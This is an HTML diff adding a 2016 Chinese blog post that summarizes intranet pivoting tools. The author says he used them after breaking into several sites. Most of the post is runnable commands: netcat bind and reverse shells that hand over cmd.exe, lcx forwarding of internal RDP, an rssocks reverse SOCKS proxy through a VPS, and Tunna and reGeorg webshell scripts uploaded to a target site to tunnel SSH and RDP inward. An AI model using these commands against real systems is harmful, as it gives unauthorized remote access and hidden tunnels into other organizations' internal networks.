@@ -1,0 +1,246 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>内网转发工具 | 小峰&#39;s Blog</title>
+  <meta name="author" content="xiaofeng">
+  
+  <meta name="description" content="这几天搞了几个站，生气！都是内网服务器，外网根本连不上内网，于是乎就只能上网搜内网转发工具的使用，索性就做一个总结，下载碰到这种情况，不至于盲目的谷歌。这次就介绍了nc、lcx、sSocket、tunna、reGeorg这几个好用平常用的又多的工具，当然网上写的也很好。0x01 nc反弹CMDshe">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="内网转发工具"/>
+  <meta property="og:site_name" content="小峰&#39;s Blog"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.png" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="小峰&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+<a href="https://github.com/xiaofengtongxue/xiaofengtongxue.github.io.git" target="_blank">
+<img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_white_ffffff.png" alt="Fork me on GitHub">
+</a>
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">小峰&#39;s Blog</a></h1>
+  <h2><a href="/">一个不抽烟 不喝酒的少年</a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+      <li><a href="//about">About</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-07-28T23:58:16.000Z"><a href="/2016/07/29/29/">2016-07-29</a></time>
+      
+      
+  
+    <h1 class="title">内网转发工具</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h3 id="这几天搞了几个站，生气！都是内网服务器，外网根本连不上内网，于是乎就只能上网搜内网转发工具的使用，索性就做一个总结，下载碰到这种情况，不至于盲目的谷歌。这次就介绍了nc、lcx、sSocket、tunna、reGeorg这几个好用平常用的又多的工具，当然网上写的也很好。"><a href="#这几天搞了几个站，生气！都是内网服务器，外网根本连不上内网，于是乎就只能上网搜内网转发工具的使用，索性就做一个总结，下载碰到这种情况，不至于盲目的谷歌。这次就介绍了nc、lcx、sSocket、tunna、reGeorg这几个好用平常用的又多的工具，当然网上写的也很好。" class="headerlink" title="这几天搞了几个站，生气！都是内网服务器，外网根本连不上内网，于是乎就只能上网搜内网转发工具的使用，索性就做一个总结，下载碰到这种情况，不至于盲目的谷歌。这次就介绍了nc、lcx、sSocket、tunna、reGeorg这几个好用平常用的又多的工具，当然网上写的也很好。"></a>这几天搞了几个站，生气！都是内网服务器，外网根本连不上内网，于是乎就只能上网搜内网转发工具的使用，索性就做一个总结，下载碰到这种情况，不至于盲目的谷歌。这次就介绍了nc、lcx、sSocket、tunna、reGeorg这几个好用平常用的又多的工具，当然网上写的也很好。</h3><h2 id="0x01-nc反弹CMDshell"><a href="#0x01-nc反弹CMDshell" class="headerlink" title="0x01 nc反弹CMDshell"></a>0x01 nc反弹CMDshell</h2><h4 id="环境本机：192-168-1-2-win7-远程机器：192-168-1-3-xp"><a href="#环境本机：192-168-1-2-win7-远程机器：192-168-1-3-xp" class="headerlink" title="环境本机：192.168.1.2(win7) 远程机器：192.168.1.3(xp)"></a>环境本机：192.168.1.2(win7) 远程机器：192.168.1.3(xp)</h4><h3 id="正向连接："><a href="#正向连接：" class="headerlink" title="正向连接："></a>正向连接：</h3><p>在远程机器上(t参数可以省略)</p>
+<pre><code>nc -l -p 8888 -t -e cmd.exe
+</code></pre><p>在本地机器上</p>
+<pre><code>nc -nvv 192.168.1.3 8888
+</code></pre><p>成功之后，本地机器就获得了一个远程机器的shell</p>
+<h3 id="反向连接："><a href="#反向连接：" class="headerlink" title="反向连接："></a>反向连接：</h3><p>在本机运行上</p>
+<pre><code>nc -l -p 8888
+</code></pre><p>在远程机器上(t可省略)</p>
+<pre><code>nc -t -e cmd.exe 192.168.1.2 8888
+</code></pre><p>然后成功之后，本地机器上已经获得了远程机器的cmdshell</p>
+<h2 id="0x02-LCX转发"><a href="#0x02-LCX转发" class="headerlink" title="0x02 LCX转发"></a>0x02 LCX转发</h2><p>内网机器上执行</p>
+<pre><code>lcx.exe –slave 192.168.1.3 8888 192.168.1.2 3389
+</code></pre><p>将内网的3389端口转发到公网的8888端口<br>然后在公网的上监听8888端口，转发3389端口</p>
+<pre><code>Lcx.exe –listen 8888 3389
+</code></pre><p>Ok，已将内网的3389转发到了公网的3389端口，我们在本地机器上远程公网IP，就连接上了内网机器的3389</p>
+<h2 id="0x03-sSocket"><a href="#0x03-sSocket" class="headerlink" title="0x03 sSocket"></a>0x03 sSocket</h2><p>一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，就是将远程计算机作为socks代理服务端，反弹回本地，很好、很方便。</p>
+<p>先在vps监听1088端口</p>
+<pre><code>rcsocket.exe –l 1088 –p 8888 –vv,
+</code></pre><p>内网机器执行</p>
+<pre><code>./rssocks –vv –s 192.168.1.10:8888(VPS)
+</code></pre><p>成功，则会看到会话建立<br>设置代理，让本机可以通过VPS的1088端口访问内网机器<br>本机上 ssh 192.168.1.4内网主机<br>成功ssh到内网机器</p>
+<h2 id="0x04-Tunna转发"><a href="#0x04-Tunna转发" class="headerlink" title="0x04 Tunna转发"></a>0x04 Tunna转发</h2><p>上传源码包中文件夹webshell下的脚本至网站目录，然后本地进行连接上传的webshell</p>
+<pre><code>python proxy.py -u http://172.0.0.1/conn.jsp -l 8888 -r 22 -v -s
+</code></pre><p>然后在xshell中执行</p>
+<pre><code>ssh 127.0.0.1 8888
+</code></pre><p>同样的，如果内网的机器是windows，就把3389转出来</p>
+<pre><code>proxy.py -u http://127.0.0.1/conn.jsp -l 8888 -r 3389 -v
+</code></pre><p>其中几个参数的解释：<br> -l 表示本地监听的端口<br> -r 远程要转发的端口<br> -v 详细模式<br> -s 避免中断<br>另外，如果脚本传到了内网A机器上，但是想登录内网B机器，那么可以-a参数指定机器<br>将内网中192.168.1.5主机的3389转发到本地</p>
+<pre><code>./proxy.py -u http://192.x.x.x/conn.jsp -l 1234 -a 192.168.1.5 -r 3389
+</code></pre><h2 id="0x05-reGeorg-proxifier正向代理"><a href="#0x05-reGeorg-proxifier正向代理" class="headerlink" title="0x05 reGeorg+proxifier正向代理"></a>0x05 reGeorg+proxifier正向代理</h2><p>reGeorg是reDuh的继承者，利用了会话层的socks5协议，效率更高一些。这也是平时用的比较多的工具。Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。</p>
+<p>先将reGeorg的对应脚本上传到服务器端，直接访问显示“Georg says, ‘All seems fine’”，表示脚本运行正常</p>
+<p>运行</p>
+<pre><code>python reGeorgSocksProxy.py -p 8888 -u http://www.xxx.com/tunnel.php
+</code></pre><p>将proxifier打开，在Proxy Server中选择SOCKS Version5<br>然后就可以在本地访问内网的机器</p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+  
+  <div class="tags">
+    <a href="/tags/渗透工具/">渗透工具</a>
+  </div>
+
+        <div class="bdsharebuttonbox">
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone"></a>
+    <a href="#" class="bds_tsina" data-cmd="tsina"></a>
+    <a href="#" class="bds_tqq" data-cmd="tqq"></a>
+    <a href="#" class="bds_renren" data-cmd="renren"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin"></a>
+</div>
+
+<script>
+    window._bd_share_config = {
+        "common": {
+            "bdSnsKey": {},
+            "bdText": "",
+            "bdMini": "2",
+            "bdPic": "",
+            "bdStyle": "0",
+            "bdSize": "16"
+        },
+        "share": {},
+        "image": {
+            "viewList": ["qzone", "tsina", "tqq", "renren", "weixin"],
+            "viewText": “分享到",
+            "viewSize": "16"
+        },
+        "selectShare": {
+            "bdContainerClass": null,
+            "bdSelectMiniList": ["qzone", "tsina", "tqq", "renren", "weixin"]
+        }
+    };
+    with(document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = 'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=' + ~(-new Date() / 36e5)];
+</script>
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+  <h1 class="title">Kommentare</h1>
+
+  
+      <div id="fb-root"></div>
+<script>
+  (function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=123456789012345";
+    fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));
+</script>
+
+<div class="fb-comments" data-href="http://yoursite.com/2016/07/29/29/index.html" data-num-posts="5" data-width="840" data-colorscheme="light"></div>
+      
+  
+</section>
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <SCRIPT language=javascript>
+function search(formname) {
+    formname.method = "get";
+    formname.action = "http://www.baidu.com/baidu";
+    document.search_form.word.value = document.search_form.word.value + " site:mjiayou.com";
+    return true;
+}
+</SCRIPT>
+
+<div class="search">
+    <form name="search_form" target="_blank" onsubmit="search(this)">
+        <input type="search" name="word" results="0" placeholder="百度站内搜索" onblur="this.value=''">
+        <!-- <input type="submit" value="搜索"> -->
+    </form>
+</div>
+
+  
+
+  
+<div class="widget tag">
+  <h3 class="title">Tags</h3>
+  <ul class="entry">
+  
+    <li><a href="/tags/Linux基础/">Linux基础</a><small>4</small></li>
+  
+    <li><a href="/tags/php/">php</a><small>6</small></li>
+  
+    <li><a href="/tags/python/">python</a><small>5</small></li>
+  
+    <li><a href="/tags/web安全/">web安全</a><small>5</small></li>
+  
+    <li><a href="/tags/渗透学习/">渗透学习</a><small>4</small></li>
+  
+    <li><a href="/tags/渗透工具/">渗透工具</a><small>1</small></li>
+  
+    <li><a href="/tags/生活感悟/">生活感悟</a><small>2</small></li>
+  
+    <li><a href="/tags/经验总结/">经验总结</a><small>1</small></li>
+  
+    <li><a href="/tags/读书笔记/">读书笔记</a><small>2</small></li>
+  
+  </ul>
+</div>
+
+
+  <iframe width="100%" height="550" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=550&fansRow=1&ptype=1&speed=0&skin=3&isTitle=0&noborder=1&isWeibo=0&isFans=0&uid=3869837461&verifier=7b3bd9e7&dpc=1"></iframe>
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2016 xiaofeng
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="//ajax.useso.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+</body>
+</html>
